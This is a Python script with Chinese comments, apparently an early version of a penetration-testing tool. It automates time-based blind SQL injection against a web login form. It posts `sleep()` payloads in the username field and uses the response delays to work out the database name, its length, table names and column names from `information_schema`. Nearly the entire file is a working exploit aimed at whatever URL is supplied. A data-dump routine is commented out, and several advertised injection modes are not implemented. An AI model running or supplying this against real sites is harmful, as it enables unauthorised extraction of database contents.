import requests
import argparse
from loguru import logger
import time
import collections
import tqdm  # 进度条库

value = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!{}"
'''
haveget:
        length:数据库长度
                curr:当前数据库长度
        database:数据库名字
                curr:当前数据库名字
        table:表名字
                curr:当前数据库内表
                    0:一共有几个表
                    1:第一个表名字
                    2:第二个表名字
                    ………………

        column:列名字
                [table]:当前表
                        0:一共有几列
                        1:第一列
                        2:第二列
                        ………………


'''
haveget = collections.defaultdict(dict)


def get_length():
    '''
    获取数据库名长度
    :return: 无
    '''
    # 该字典存储爆破到的数据库的所有信息
    global haveget
    for n in range(1, 100):
        # 一般payload
        # 这里存在优化点，用户名不一定是test
        payload = "test' and if((length((database()))={0}),sleep(2),1) #".format(n)
        # 传参表，考虑这里也需要优化，因为不一定都是username 和 password
        # 优化考虑从post表单里得到参数信息
        data = {"username": payload, "password": '123'}
        # 开始时间
        start_time = time.time()
        # post传参
        requests.post(url, data=data)
        # 结束时间
        end_time = time.time()
        use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
        if use_time > 1.5:
            print("...... data's length is :" + str(n))
            # 字典储存
            haveget['length'] = {'curr': n}
            return


def get_database():  # 获取数据
    global haveget
    result = ''
    # 得到当前数据库名长度
    # 这里也需要优化，考虑获得的非当前数据库时的情况
    length = haveget['length']['curr'] + 1
    # 遍历长度
    for n in range(1, length):
        # 遍历字典
        # 这里可以优化，考虑多线程
        for v in value:
            # 一般payload，优化点与前述相同
            payload = "test' and if(ascii(substr(database(),{0},1))={1},sleep(3),null)#".format(n, ord(v))

            data = {"username": payload, "password": '123'}
            start_time = time.time()
            requests.post(url, data=data)
            end_time = time.time()
            use_time = end_time - start_time
            if use_time > 1.5:
                result += v
                # 当前行刷新
                print("\r", "......" + result, end="", flush=True)
                break
    haveget['database'] = {'curr': result}
    return


def get_table():
    # 为表单编号，从1开始，0存储的是一共有几个表单
    currTableIndex = 1
    global haveget
    haveget['table']['curr'] = {}
    tablename = ''
    # 最多能扫描到100个表单
    for j in range(100):
        # 当前数据库表单扫描完毕标志
        tableNumGetComplete = True
        # 最多能扫描表单名长度为1000
        for i in range(1, 1000):
            # 当前表单名字扫描完毕标志
            tableNameGetComplete = True
            # 遍历字典
            for v in value:
                # 一般payload，优化点与前述相同
                payload = "test' and if(ascii(substr((select table_name from information_schema.tables where table_schema =database()limit {0},1),{1},1))={2},sleep(2),null) #".format(
                    j, i, ord(v))
                data = {"username": payload, "password": '123'}
                start_time = time.time()
                requests.post(url, data=data)
                end_time = time.time()
                use_time = end_time - start_time
                if use_time > 1.5:
                    # 如果当前还能获取到表单名，表示表单名获取还未完毕
                    tableNameGetComplete = False
                    tablename += v
                    print("\r", "......" + tablename, end="", flush=True)
                    break
            # 如果表单名获取完毕，判断当前获取的表单名是否为空，不为空则说明还有表单未获取
            if tableNameGetComplete:
                if tablename != '':
                    tableNumGetComplete = False
                    # 将获取到的表单名字存入当前数据库中
                    haveget['table']['curr'][currTableIndex] = tablename
                    currTableIndex += 1
                    print("\r", ".....table name is :" + tablename, flush=True)
                tablename = ''
                break
        # 如果当前数据库全部表单获取完毕，break
        if tableNumGetComplete: break
    # 获取完毕计算当前数据库一共有多少个表单，存入0处
    # 这里减1是因为每次都会在空时才退出，因此必然每次都会多获取1
    haveget['table']['curr'][0] = currTableIndex - 1
    # print(haveget)
    return


# 获取列名
def get_column():
    # 列的标记

    global haveget

    columnname = ''
    # 优化点，凡是写死curr的地方都要优化
    for i in range(1, haveget['table']['curr'][0] + 1):
        table = haveget['table']['curr'][i]
        haveget['column'][table] = {}
        currColumnIndex = 1
        for j in range(100):
            columnNumGetComplete = True
            for i in range(1, 1000):
                columnNameGetComplete = True
                for v in value:

                    payload = "test' and if(ascii(substr((select column_name from information_schema.columns where table_name='{0}' limit {1}, 1), {2},1))={3},sleep(2),null) #".format(
                        table, j, i, ord(v))
                    data = {"username": payload, "password": '123'}
                    start_time = time.time()
                    requests.post(url, data=data)
                    end_time = time.time()
                    use_time = end_time - start_time
                    if use_time > 1.5:
                        columnNameGetComplete = False
                        columnname += v
                        print("\r", "......" + columnname, end="", flush=True)
                        break
                if columnNameGetComplete:
                    if columnname != '':
                        columnNumGetComplete = False
                        haveget['column'][table][currColumnIndex] = columnname
                        print("\r", ".....{0} column {1} name is :".format(table, currColumnIndex) + columnname,
                              flush=True)
                        currColumnIndex += 1
                    columnname = ''
                    break
            if columnNumGetComplete: break
        haveget['column'][table][0] = currColumnIndex - 1


# # 获取数据
# def get_data(table):
#     # 列的标记
#
#     global haveget
#
#     datas=''
#     # 优化点，凡是写死curr的地方都要优化
#     for i in range(1,haveget['column'][table][0]):
#         column=haveget['column'][table][i]


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='渗透测试工具测试版！',
                                     prog='渗透测试工具！')
    parser.add_argument('--url', type=str, help='输入目标测试网站url！')
    parser.add_argument('--gpmode', type=str, default='post', help='输入传参模式：post/get')
    parser.add_argument('--mode', type=str, default='time', help='sql注入模式：bool/time/error/union/stack')
    parser.add_argument('--get', type=str, default='table',
                        help='输入要爆破出的数据库信息：database/table/columninfo/infomation/all')
    args = parser.parse_args()

    url = args.url

    if args.get == 'all':
        logger.info('{0}  正在获取当前数据库名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_length()
        logger.info('{0}  正在获取当前数据库名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_database()
        print("\r", ".....the database name is :" + haveget['database']['curr'], flush=True)
        logger.info('{0}  正在获取当前数据库表名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_table()
        logger.info('{0}  正在获取当前表列名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_column()
        print(haveget)
        logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
    else:
        if args.get == 'database':
            logger.info('{0}  正在获取当前数据库名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_length()
            database = get_database()
            print("\r", ".....the database name is :" + haveget['database']['curr'], flush=True)
            logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        elif args.get == 'table':
            logger.info('{0}  正在获取当前数据库表名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
            get_table()
            logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        else:
            logger.info('{0}  错误，当前功能暂未实现！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
